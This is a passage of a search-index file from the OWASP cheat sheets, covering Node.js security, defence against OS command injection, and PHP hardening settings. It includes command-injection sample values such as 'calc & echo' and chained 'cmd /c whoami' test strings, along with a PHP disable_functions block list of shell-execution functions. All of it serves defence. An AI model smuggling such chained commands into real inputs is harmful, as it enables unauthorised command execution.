users and their roles should be determined with consideration of the principle of least privilege. Each user role should only have access to the resources they must use. For your Node.js applications, you can use acl module to provide ACL (access control list) implementation. With this module, you can create roles and assign users to these roles.","title":"Use access control lists"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#error-exception-handling","text":"","title":"Error &amp; Exception Handling"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#handle-uncaughtexception","text":"Node.js behavior for uncaught exceptions is to print current stack trace and then terminate the thread. However, Node.js allows customization of this behavior. It provides a global object named process which is available to all Node.js applications. It is an EventEmitter object and in case of an uncaught exception, uncaughtException event gets emitted and it is brought up to the main event loop. In order to provide a custom behavior for uncaught exceptions, you can bind to this event. However, resuming the application after such an uncaught exception can lead to further problems. Therefore, if you do not want to miss any uncaught exception, you should bind to uncaughtException event and cleanup any allocated resources like file descriptors, handles and similar before shutting down the process. Resuming the application is strongly discouraged as the application will be in an unknown state. Also, it is important to note that when displaying error messages to the user in case of an uncaught exception, detailed information like stack traces should not be revealed to the user. Instead, custom error messages should be shown to the users in order not to cause any information leakage. process . on ( \"uncaughtException\" , function ( err ) { // clean up allocated resources // log necessary error details to log files process . exit (); // exit the process to avoid unknown state });","title":"Handle uncaughtException"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#listen-to-errors-when-using-eventemitter","text":"When using EventEmitter, errors can occur anywhere in the event chain. Normally, if an error occurs in an EventEmitter object, an error event which has an Error object as an argument is called. However, if there are no attached listeners to that error event, the Error object that is sent as an argument is thrown and becomes an uncaught exception. In short, if you do not handle errors within an EventEmitter object properly, these unhandled errors may crash your application. Therefore, you should always listen to error events when using EventEmitter objects. var events = require ( 'events' ); var myEventEmitter = function (){ events . EventEmitter . call ( this ); } require ( 'util' ). inherits ( myEventEmitter , events . EventEmitter ); myEventEmitter . prototype . someFunction = function ( param1 , param2 ) { //in case of an error this . emit ( 'error' , err ); } var emitter = new myEventEmitter (); emitter . on ( 'error' , function ( err ){ //Perform necessary error handling here });","title":"Listen to errors when using EventEmitter"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#handle-errors-in-asynchronous-calls","text":"Errors that occur within asynchronous callbacks are easy to miss. Therefore, as a general principle first argument to the asynchronous calls should be an Error object. Also, express routes handle errors itself, but it should be always remembered that errors occurred in asynchronous calls made within express routes are not handled, unless an Error object is sent as a first argument. Errors in these callbacks can be propagated as many times as possible. Each callback that the error has been propagated to can ignore, handle or propagate the error.","title":"Handle errors in asynchronous calls"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#server-security","text":"","title":"Server Security"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#set-cookie-flags-appropriately","text":"Generally, session information is sent using cookies in web applications. However, improper use of HTTP cookies can render an application to several session management vulnerabilities. There are some flags that can be set for each cookie to prevent these kinds of attacks. httpOnly , Secure and SameSite flags are very important for session cookies. httpOnly flag prevents the cookie from being accessed by client-side JavaScript. This is an effective counter-measure for XSS attacks. Secure flag lets the cookie to be sent only if the communication is over HTTPS. SameSite flag can prevent cookies from being sent in cross-site requests which helps protect against Cross-Site Request Forgery (CSRF) attacks. Apart from these, there are other flags like domain, path and expires. Setting these flags appropriately is encouraged, but they are mostly related to cookie scope not the cookie security. Sample usage of these flags is given in the following example: var session = require ( 'express-session' ); app . use ( session ({ secret : 'your-secret-key' , key : 'cookieName' , cookie : { secure : true , httpOnly : true , path : '/user' , sameSite : true } }));","title":"Set cookie flags appropriately"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#use-appropriate-security-headers","text":"There are several different HTTP security headers that can help you prevent some common attack vectors. These are listed below: Strict-Transport-Security : HTTP Strict Transport Security (HSTS) dictates browsers that the application can only be accessed via HTTPS connections. In order to use it in your application, add the following codes: app . use ( helmet . hsts ()); // default configuration app . use ( helmet . hsts ( \"<max-age>\" , \"<includeSubdomains>\" )); // custom configuration X-Frame-Options : determines if a page can be loaded via a <frame> or an <iframe> element. Allowing the page to be framed may result in Clickjacking attacks. This header can be used with helmet module as follows: app . use ( helmet . xframe ()); // default behavior (DENY) helmet . xframe ( 'sameorigin' ); // SAMEORIGIN helmet . xframe ( 'allow-from' , 'http://alloweduri.com' ); //ALLOW-FROM uri X-XSS-Protection : As described in the XSS Prevention Cheat Sheet , this header should be set to 0 to disable the XSS Auditor. An issue was created in the helmetjs project to be able to set the header to 0 . Once it's updated, this section will be updated to inform the user to disable the XSS auditor properly using helmetjs. X-Content-Type-Options : Even if the server sets a valid Content-Type header in the response, browsers may try to sniff the MIME type of the requested resource. This header is a way to stop this behavior and tell the browser not to change MIME types specified in Content-Type header. It can be configured in the following way: app . use ( helmet . noSniff ()); Content-Security-Policy : Content Security Policy is developed to reduce the risk of attacks like Cross-Site Scripting (XSS) and Clickjacking . Basically, it allows content from a whitelist you decide. It has several directives each of which prohibits loading specific type of a content. You can refer to Content Security Policy Cheat Sheet for detailed explanation of each directive and how to use it. You can implement these settings in your application as follows: const csp = require ( 'helmet-csp' ) app . use ( csp ({ directives : { defaultSrc : [ \"'self'\" ], // default value for all directives that are absent scriptSrc : [ \"'self'\" ], // helps prevent XSS attacks frameAncestors : [ \"'none'\" ], // helps prevent Clickjacking attacks imgSrc : [ \"'self'\" , \"'http://imgexample.com'\" ], styleSrc : [ \"'none'\" ] } })) Cache-Control and Pragma : Cache-Control header can be used to prevent browsers from caching the given responses. This should be done for pages which contains sensitive information about either the user or the application. However, disabling caching for pages that do not contain sensitive information may seriously affect the performance of the application. Therefore, caching should only be disabled for pages that return sensitive information. Appropriate caching controls and headers can be used easily by the following code: app . use ( helmet . noCache ()); The above code sets Cache-Control, Surrogate-Control, Pragma and Expires headers accordingly. X-Download-Options: This header prevents Internet Explorer from executing downloaded files in the site's context. This is achieved with noopen directive. You can do so with the following piece of code: app . use ( helmet . ieNoOpen ()); Expect-CT : Certificate Transparency is a new mechanism developed to fix some structural problems regarding current SSL infrastructure. Expect-CT header may enforce certificate transparency requirements. It can be implemented in your application as follows: var expectCt = require ( 'expect-ct' ); app . use ( expectCt ({ maxAge : 123 })); app . use ( expectCt ({ enforce : true , maxAge : 123 })); app . use ( expectCt ({ enforce : true , maxAge : 123 , reportUri : 'http://example.com' })); Public-Key-Pins : This header increases the security of HTTPS. With this header, a specific cryptographic public key is associated with a specific web server. If the server does not use the pinned keys in future, the browser regards the responses as illegitimate. It can be used as follows: app . use ( helmet . hpkp ({ maxAge : 123 , sha256s : [ 'Ab3Ef123=' , 'ZyxawuV45=' ], reportUri : 'http://example.com' , includeSubDomains : true })); As discussed in Transport Layer Security Cheat Sheet , the decision to use public key pinning should be made with careful consideration, since it may cause locking out users for a long time if used incorrectly. X-Powered-By: X-Powered-By header is used to inform what technology is used in the server side. This is an unnecessary header causing information leakage, so it should be removed from your application. To do so, you can use the hidePoweredBy as follows: app . use ( helmet . hidePoweredBy ()); Also, you can lie about the technologies used with this header. For example, even if your application does not use PHP, you can set X-Powered-By header to seem so. app . use ( helmet . hidePoweredBy ({ setTo : 'PHP 4.2.0' }));","title":"Use appropriate security headers"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#platform-security","text":"","title":"Platform Security"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#keep-your-packages-up-to-date","text":"Security of your application depends directly on how secure the third-party packages you use in your application are. Therefore, it is important to keep your packages up-to-date. It should be noted that Using Components with Known Vulnerabilities is still in the OWASP Top 10. You can use OWASP Dependency-Check to see if any of the packages used in the project has a knwon vulnerability. Also you can use Retire.js to check JavaScript libraries with known vulnerabilities. In order to use it, you can run the following commands in the source code folder of your application: npm install -g retire retire There are several other tools you can use to check your dependencies. A more comprehensive list can be found in Vulnerable Dependency Management CS .","title":"Keep your packages up-to-date"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#do-not-use-dangerous-functions","text":"There are some JavaScript functions that are dangerous and should only be used where absolutely necessary. To the fullest possible extent, use of such functions and modules should be avoided. The first example is the eval() function. This function takes a string argument and executes it as any other JavaScript source code. Combined with user input, this behavior inherently leads to remote code execution vulnerability. Similarly, calls to child_process.exec are also very dangerous. This function acts as a bash interpreter and sends its arguments to /bin/sh. By injecting input to this function, attackers can execute arbitrary commands on the server. In addition to these functions, there are some modules that require special care when being used. As an example, fs module handles filesystem operations. However, if improperly sanitized user input is fed into this module, your application may become vulnerable to file inclusion and directory traversal vulnerabilities. Similarly, vm module provides APIs for compiling and running code within V8 Virtual Machine contexts. Since it can perform dangerous actions by nature, it should be used within a sandbox. It would not be fair to say that these functions and modules should not be used whatsoever, however, they should be used carefully especially when they use with user input. Also, there are some other functions that may render your application vulnerable.","title":"Do not use dangerous functions"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#stay-away-from-evil-regexes","text":"The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time. The Regular Expression Denial of Service (ReDoS) is a type of Denial of Service attack which uses regular expressions. Some Regular Expression (Regex) implementations cause extreme situations that makes the application very slow. Attackers can use such regex implementations to cause application to get into these extreme situations and hang for a long time. Such regexes are called evil if application can be stuck on crafted input. Generally, these regexes are exploited by grouping with repetition and alternation with overlapping. For example, the following regular expression ^(([a-z])+.)+[A-Z]([a-z])+$ can be used to specify Java class names. However, a very long string (aaaa...aaaaAaaaaa...aaaa) can also match with this regular expression. There are some tools to check if a regex has a potential for causing denial of service. One example is vuln-regex-detector .","title":"Stay away from evil regexes"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#run-security-linters-periodically","text":"When developing code, keeping all security tips in mind can be really difficult. Also keeping all team members obey these rules is nearly impossible. This is why there are Static Analysis Security Testing (SAST) tools. These tools do not execute your code, but they simply look for patterns that can contain security risks. As JavaScript is a dynamic and loosely-typed language, linting tools are really essential in the software development life cycle. These tools should be run periodically and the findings should be audited. Another advantage of these tools is the feature that you can add custom rules for patterns that you may see dangerous. ESLint and JSHint are commonly used SAST tools for JavaScript linting.","title":"Run security linters periodically"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#use-strict-mode","text":"JavaScript has a number of unsafe and dangerous legacy features that should not be used. In order to remove these features, ES5 included a strict mode for developers. With this mode, errors that were silent previously are thrown. It also helps JavaScript engines perform optimizations. With strict mode, previously accepted bad syntax causes real errors. Because of these improvements, you should always use strict mode in your application. In order to enable strict mode, you just need to write \"use strict\"; on top of your code. The following code will generate a ReferenceError: Can't find variable: y on the console which will not be displayed unless strict mode is used. \"use strict\" ; func (); function func () { y = 3.14 ; // This will cause an error (y is not defined) }","title":"Use strict mode"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#adhere-to-general-application-security-principles","text":"This list has mainly focused on issues that are common in Node.js applications. Also, recommendations against these issues are given specific to Node.js environment. Apart from these, there are general security by design principles that apply to web applications regardless of technologies used in application server. You should also keep those principles in mind while developing your applications. Also, you can always refer to OWASP Cheat Sheet Series to learn more about web application vulnerabilities and mitigation techniques used against them.","title":"Adhere to general application security principles"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#additional-resources-about-nodejs-security","text":"Awesome Node.js Security resources","title":"Additional resources about Node.js security"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html","text":"OS Command Injection Defense Cheat Sheet \u00b6 Introduction \u00b6 Command injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command. For example, if the supplied value is: calc when typed in a Windows command prompt, the application Calculator is displayed. However, if the supplied value has been tampered with, and now it is: calc & echo \"test\" when executed, it changes the meaning of the initial intended value. Now, both the Calculator application and the value test are displayed: The problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage. Primary Defenses \u00b6 Defense Option 1: Avoid calling OS commands directly \u00b6 The primary defense is to avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do. For example use mkdir() instead of system(\"mkdir /dir_name\") . If there are available libraries or APIs for the language you use, this is the preferred method. Defense option 2: Escape values added to OS commands specific to each OS \u00b6 TODO: To enhance. For examples, see escapeshellarg() or escapeshellcmd() in PHP. Defense option 3: Parameterization in conjunction with Input Validation \u00b6 If calling a system command that incorporates user-supplied cannot be avoided, the following two layers of defense should be used within software to prevent attacks: Layer 1 \u00b6 Parameterization: If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help provide the relevant quoting and encoding. Layer 2 \u00b6 Input validation: The values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments: When it comes to the commands used, these must be validated against a whitelist of allowed commands. In regards to the arguments used for these commands, they should be validated using the following options: Positive or whitelist input validation : Where are the arguments allowed explicitly defined. White list Regular Expression : Where a whitelist of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in Note A and white-spaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: ^[a-z0-9]{3,10}$ Note A: & | ; $ > < ` \\ ! Additional Defenses \u00b6 On top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth. These additional defenses are: Applications should run using the lowest privileges that are required to accomplish the necessary tasks. If possible, create isolated accounts with limited privileges that are only used for a single task. Code examples \u00b6 Java \u00b6 In Java, use ProcessBuilder and the command must be separated from its arguments. Note about the Java's Runtime.exec method behavior: There are many sites that will tell you that Java's Runtime.exec is exactly the same as C 's system function. This is not true. Both allow you to invoke a new program/process. However, C 's system function passes its arguments to the shell ( /bin/sh ) to be parsed, whereas Runtime.exec tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters. Runtime.exec does NOT try to invoke the shell at any point and does not support shell metacharacters . The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using & , && , | , || , etc, redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter. Code to test the note above: String [] specialChars = new String [] { \"&\" , \"&&\" , \"|\" , \"||\" }; String payload = \"cmd /c whoami\" ; String cmdTemplate = \"java -version %s \" + payload ; String cmd ; Process p ; int returnCode ; for ( String specialChar : specialChars ) { cmd = String . format ( cmdTemplate , specialChar ); System . out . printf ( \"#### TEST CMD: %s\\n\" , cmd ); p = Runtime . getRuntime (). exec ( cmd ); returnCode = p . waitFor (); System . out . printf ( \"RC : %s\\n\" , returnCode ); System . out . printf ( \"OUT :\\n%s\\n\" , IOUtils . toString ( p . getInputStream (), \"utf-8\" )); System . out . printf ( \"ERROR :\\n%s\\n\" , IOUtils . toString ( p . getErrorStream (), \"utf-8\" )); } System . out . printf ( \"#### TEST PAYLOAD ONLY: %s\\n\" , payload ); p = Runtime . getRuntime (). exec ( payload ); returnCode = p . waitFor (); System . out . printf ( \"RC : %s\\n\" , returnCode ); System . out . printf ( \"OUT :\\n%s\\n\" , IOUtils . toString ( p . getInputStream (), \"utf-8\" )); System . out . printf ( \"ERROR :\\n%s\\n\" , IOUtils . toString ( p . getErrorStream (), \"utf-8\" )); Result of the test: ##### TEST CMD: java -version & cmd /c whoami RC : 0 OUT : ERROR : java version \"1.8.0_31\" ##### TEST CMD: java -version && cmd /c whoami RC : 0 OUT : ERROR : java version \"1.8.0_31\" ##### TEST CMD: java -version | cmd /c whoami RC : 0 OUT : ERROR : java version \"1.8.0_31\" ##### TEST CMD: java -version || cmd /c whoami RC : 0 OUT : ERROR : java version \"1.8.0_31\" ##### TEST PAYLOAD ONLY: cmd /c whoami RC : 0 OUT : mydomain\\simpleuser ERROR : Incorrect usage: ProcessBuilder b = new ProcessBuilder ( \"C:\\DoStuff.exe -arg1 -arg2\" ); In this example, the command together with the arguments are passed as a one string, making it easy to manipulate that expression and inject malicious strings. Correct Usage: Here is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This makes it easy to validate each term and reduces the risk of malicious strings being inserted. ProcessBuilder pb = new ProcessBuilder ( \"TrustedCmd\" , \"TrustedArg1\" , \"TrustedArg2\" ); Map < String , String > env = pb . environment (); pb . directory ( new File ( \"TrustedDir\" )); Process p = pb . start (); .Net \u00b6 In .Net use System.Diagnostics.Process.Start to call underlying OS functions. System . Diagnostics . Process process = new System . Diagnostics . Process (); System . Diagnostics . ProcessStartInfo startInfo = new System . Diagnostics . ProcessStartInfo (); startInfo . FileName = \"validatedCommand\" ; startInfo . Arguments = \"validatedArg1 validatedArg2 validatedArg3\" ; process . StartInfo = startInfo ; process . Start (); PHP \u00b6 In PHP use escapeshellarg() or escapeshellcmd() rather than exec() , system() , passthru() . Related articles \u00b6 Description of Command Injection Vulnerability \u00b6 OWASP Command Injection . How to Avoid Vulnerabilities \u00b6 C Coding: Do not call system() . How to Review Code \u00b6 OWASP Reviewing Code for OS Injection . How to Test \u00b6 OWASP Testing Guide article on Testing for Command Injection . External References \u00b6 CWE Entry 77 on Command Injection .","title":"OS Command Injection Defense"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#os-command-injection-defense-cheat-sheet","text":"","title":"OS Command Injection Defense Cheat Sheet"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#introduction","text":"Command injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command. For example, if the supplied value is: calc when typed in a Windows command prompt, the application Calculator is displayed. However, if the supplied value has been tampered with, and now it is: calc & echo \"test\" when executed, it changes the meaning of the initial intended value. Now, both the Calculator application and the value test are displayed: The problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage.","title":"Introduction"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#primary-defenses","text":"","title":"Primary Defenses"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#defense-option-1-avoid-calling-os-commands-directly","text":"The primary defense is to avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do. For example use mkdir() instead of system(\"mkdir /dir_name\") . If there are available libraries or APIs for the language you use, this is the preferred method.","title":"Defense Option 1: Avoid calling OS commands directly"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#defense-option-2-escape-values-added-to-os-commands-specific-to-each-os","text":"TODO: To enhance. For examples, see escapeshellarg() or escapeshellcmd() in PHP.","title":"Defense option 2: Escape values added to OS commands specific to each OS"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#defense-option-3-parameterization-in-conjunction-with-input-validation","text":"If calling a system command that incorporates user-supplied cannot be avoided, the following two layers of defense should be used within software to prevent attacks:","title":"Defense option 3: Parameterization in conjunction with Input Validation"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#layer-1","text":"Parameterization: If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help provide the relevant quoting and encoding.","title":"Layer 1"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#layer-2","text":"Input validation: The values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments: When it comes to the commands used, these must be validated against a whitelist of allowed commands. In regards to the arguments used for these commands, they should be validated using the following options: Positive or whitelist input validation : Where are the arguments allowed explicitly defined. White list Regular Expression : Where a whitelist of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in Note A and white-spaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: ^[a-z0-9]{3,10}$ Note A: & | ; $ > < ` \\ !","title":"Layer 2"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#additional-defenses","text":"On top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth. These additional defenses are: Applications should run using the lowest privileges that are required to accomplish the necessary tasks. If possible, create isolated accounts with limited privileges that are only used for a single task.","title":"Additional Defenses"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#code-examples","text":"","title":"Code examples"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#java","text":"In Java, use ProcessBuilder and the command must be separated from its arguments. Note about the Java's Runtime.exec method behavior: There are many sites that will tell you that Java's Runtime.exec is exactly the same as C 's system function. This is not true. Both allow you to invoke a new program/process. However, C 's system function passes its arguments to the shell ( /bin/sh ) to be parsed, whereas Runtime.exec tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters. Runtime.exec does NOT try to invoke the shell at any point and does not support shell metacharacters . The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using & , && , | , || , etc, redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter. Code to test the note above: String [] specialChars = new String [] { \"&\" , \"&&\" , \"|\" , \"||\" }; String payload = \"cmd /c whoami\" ; String cmdTemplate = \"java -version %s \" + payload ; String cmd ; Process p ; int returnCode ; for ( String specialChar : specialChars ) { cmd = String . format ( cmdTemplate , specialChar ); System . out . printf ( \"#### TEST CMD: %s\\n\" , cmd ); p = Runtime . getRuntime (). exec ( cmd ); returnCode = p . waitFor (); System . out . printf ( \"RC : %s\\n\" , returnCode ); System . out . printf ( \"OUT :\\n%s\\n\" , IOUtils . toString ( p . getInputStream (), \"utf-8\" )); System . out . printf ( \"ERROR :\\n%s\\n\" , IOUtils . toString ( p . getErrorStream (), \"utf-8\" )); } System . out . printf ( \"#### TEST PAYLOAD ONLY: %s\\n\" , payload ); p = Runtime . getRuntime (). exec ( payload ); returnCode = p . waitFor (); System . out . printf ( \"RC : %s\\n\" , returnCode ); System . out . printf ( \"OUT :\\n%s\\n\" , IOUtils . toString ( p . getInputStream (), \"utf-8\" )); System . out . printf ( \"ERROR :\\n%s\\n\" , IOUtils . toString ( p . getErrorStream (), \"utf-8\" )); Result of the test: ##### TEST CMD: java -version & cmd /c whoami RC : 0 OUT : ERROR : java version \"1.8.0_31\" ##### TEST CMD: java -version && cmd /c whoami RC : 0 OUT : ERROR : java version \"1.8.0_31\" ##### TEST CMD: java -version | cmd /c whoami RC : 0 OUT : ERROR : java version \"1.8.0_31\" ##### TEST CMD: java -version || cmd /c whoami RC : 0 OUT : ERROR : java version \"1.8.0_31\" ##### TEST PAYLOAD ONLY: cmd /c whoami RC : 0 OUT : mydomain\\simpleuser ERROR : Incorrect usage: ProcessBuilder b = new ProcessBuilder ( \"C:\\DoStuff.exe -arg1 -arg2\" ); In this example, the command together with the arguments are passed as a one string, making it easy to manipulate that expression and inject malicious strings. Correct Usage: Here is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This makes it easy to validate each term and reduces the risk of malicious strings being inserted. ProcessBuilder pb = new ProcessBuilder ( \"TrustedCmd\" , \"TrustedArg1\" , \"TrustedArg2\" ); Map < String , String > env = pb . environment (); pb . directory ( new File ( \"TrustedDir\" )); Process p = pb . start ();","title":"Java"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#net","text":"In .Net use System.Diagnostics.Process.Start to call underlying OS functions. System . Diagnostics . Process process = new System . Diagnostics . Process (); System . Diagnostics . ProcessStartInfo startInfo = new System . Diagnostics . ProcessStartInfo (); startInfo . FileName = \"validatedCommand\" ; startInfo . Arguments = \"validatedArg1 validatedArg2 validatedArg3\" ; process . StartInfo = startInfo ; process . Start ();","title":".Net"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#php","text":"In PHP use escapeshellarg() or escapeshellcmd() rather than exec() , system() , passthru() .","title":"PHP"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#related-articles","text":"","title":"Related articles"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#description-of-command-injection-vulnerability","text":"OWASP Command Injection .","title":"Description of Command Injection Vulnerability"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#how-to-avoid-vulnerabilities","text":"C Coding: Do not call system() .","title":"How to Avoid Vulnerabilities"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#how-to-review-code","text":"OWASP Reviewing Code for OS Injection .","title":"How to Review Code"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#how-to-test","text":"OWASP Testing Guide article on Testing for Command Injection .","title":"How to Test"},{"location":"cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#external-references","text":"CWE Entry 77 on Command Injection .","title":"External References"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html","text":"PHP Configuration Cheat Sheet \u00b6 Introduction \u00b6 This page is meant to help those configuring PHP and the web server it is running on to be very secure. Below you will find information on the proper settings for the php.ini file and instructions on configuring Apache, Nginx, and Caddy web servers. For general PHP codebase security please refer to the two following great guides: Paragonie's 2018 PHP Security Guide Awesome PHP Security PHP Configuration and Deployment \u00b6 php.ini \u00b6 Some of following settings need to be adapted to your system, in particular session.save_path , session.cookie_path (e.g. /var/www/mysite ), and session.cookie_domain (e.g. ExampleSite.com ). You should also be running PHP 7.2 or later. If running PHP 7.0 and 7.1, you will use slightly different values in a couple of places below (see inline comments). Finally look through the PHP Manual for a complete reference on every value in the php.ini configuration file. You can find a copy of the following values in a ready-to-go php.ini file here . PHP error handling \u00b6 expose_php = Off error_reporting = E_ALL display_errors = Off display_startup_errors = Off log_errors = On error_log = /valid_path/PHP-logs/php_error.log ignore_repeated_errors = Off Keep in mind that you need to have display_errors to Off on a production server and it's a good idea to frequently notice the logs. PHP general settings \u00b6 doc_root = /path/DocumentRoot/PHP-scripts/ open_basedir = /path/DocumentRoot/PHP-scripts/ include_path = /path/PHP-pear/ extension_dir = /path/PHP-extensions/ mime_magic.magicfile = /path/PHP-magic.mime allow_url_fopen = Off allow_url_include = Off variables_order = \"GPCS\" allow_webdav_methods = Off session.gc_maxlifetime = 600 allow_url_* prevents LFI s to be easily escalated to RFI s. PHP file upload handling \u00b6 file_uploads = On upload_tmp_dir = /path/PHP-uploads/ upload_max_filesize = 2M max_file_uploads = 2 If your application is not using file uploads, and say the only data the user will enter / upload is forms that do not require any document attachments, file_uploads should be turned Off . PHP executable handling \u00b6 enable_dl = Off disable_functions = system, exec, shell_exec, passthru, phpinfo, show_source, highlight_file, popen, proc_open, fopen_with_path, dbmopen, dbase_open, putenv, move_uploaded_file, chdir, mkdir, rmdir, chmod, rename, filepro, filepro_rowcount, filepro_retrieve, posix_mkfifo # see also: http://ir.php.net/features.safe-mode disable_classes = These are dangerous PHP functions. You should disable all that you don't use. PHP session handling \u00b6 Session settings are some of the MOST important values to concentrate on in configuring. It is a good practice to change session.name to something new. session.save_path = /path/PHP-session/ session.name = myPHPSESSID session.auto_start = Off session.use_trans_sid = 0 session.cookie_domain = full.qualified.domain.name #session.cookie_path = /application/path/ session.use_strict_mode = 1 session.use_cookies = 1 session.use_only_cookies = 1 session.cookie_lifetime = 14400 # 4 hours session.cookie_secure = 1 session.cookie_httponly = 1 session.cookie_samesite = Strict session.cache_expire = 30 session.sid_length = 256 session.sid_bits_per_character = 6 # PHP 7.2+ session.hash_function = 1 # PHP 7.0-7.1 session.hash_bits_per_character = 6 # PHP 7.0-7.1 Some more security paranoid checks \u00b6 session.referer_check = /application/path memory_limit = 50M post_max_size = 20M max_execution_time = 60 report_memleaks = On track_errors = Off html_errors = Off Suhosin \u00b6 Suhosin is a patch to PHP which provides a number of hardening and security features that are not available in the default PHP build. However, Suhosin only works with PHP 5, which is unsupported and should not be used . For PHP 7, there is Suhosin-ng , but it's in a prerelease stage, and as such should not be used in production . Snuffleupagus \u00b6 Snuffleupagus is the spiritual descendent of Suhosin for PHP 7 and onwards, with modern features . It's considered stable, and is usable in production.","title":"PHP Configuration"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#php-configuration-cheat-sheet","text":"","title":"PHP Configuration Cheat Sheet"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#introduction","text":"This page is meant to help those configuring PHP and the web server it is running on to be very secure. Below you will find information on the proper settings for the php.ini file and instructions on configuring Apache, Nginx, and Caddy web servers. For general PHP codebase security please refer to the two following great guides: Paragonie's 2018 PHP Security Guide Awesome PHP Security","title":"Introduction"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#php-configuration-and-deployment","text":"","title":"PHP Configuration and Deployment"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#phpini","text":"Some of following settings need to be adapted to your system, in particular session.save_path , session.cookie_path (e.g. /var/www/mysite ), and session.cookie_domain (e.g. ExampleSite.com ). You should also be running PHP 7.2 or later. If running PHP 7.0 and 7.1, you will use slightly different values in a couple of places below (see inline comments). Finally look through the PHP Manual for a complete reference on every value in the php.ini configuration file. You can find a copy of the following values in a ready-to-go php.ini file here .","title":"php.ini"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#php-error-handling","text":"expose_php = Off error_reporting = E_ALL display_errors = Off display_startup_errors = Off log_errors = On error_log = /valid_path/PHP-logs/php_error.log ignore_repeated_errors = Off Keep in mind that you need to have display_errors to Off on a production server and it's a good idea to frequently notice the logs.","title":"PHP error handling"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#php-general-settings","text":"doc_root = /path/DocumentRoot/PHP-scripts/ open_basedir = /path/DocumentRoot/PHP-scripts/ include_path = /path/PHP-pear/ extension_dir = /path/PHP-extensions/ mime_magic.magicfile = /path/PHP-magic.mime allow_url_fopen = Off allow_url_include = Off variables_order = \"GPCS\" allow_webdav_methods = Off session.gc_maxlifetime = 600 allow_url_* prevents LFI s to be easily escalated to RFI s.","title":"PHP 